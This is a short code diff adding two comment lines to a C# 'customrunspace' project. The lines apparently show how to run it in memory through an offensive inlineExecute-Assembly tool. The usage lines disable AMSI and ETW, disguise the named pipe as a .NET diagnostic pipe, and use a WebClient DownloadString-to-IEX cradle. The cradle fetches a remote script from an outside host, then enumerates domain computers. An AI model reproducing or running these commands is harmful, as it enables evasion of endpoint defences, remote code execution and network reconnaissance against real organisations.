@@ -49,3 +49,5 @@ namespace customrunspace
         }
     }
 }
+//inlineExecute-Assembly --dotnetassembly c:\tools\customrunspace\bin\release\customrunspace.exe --assemblyargs hostname;ps; m --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
+// inlineExecute-Assembly --dotnetassembly c:\tools\customrunspace\bin\release\customrunspace.exe --assemblyargs "(New-Object System.Net.WebClient).DownloadString('https://infinity-bank.com/pv.txt') | IEX; et-DomainComputer -Properties DnsHostName | sort -Property DnsHostName; m --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
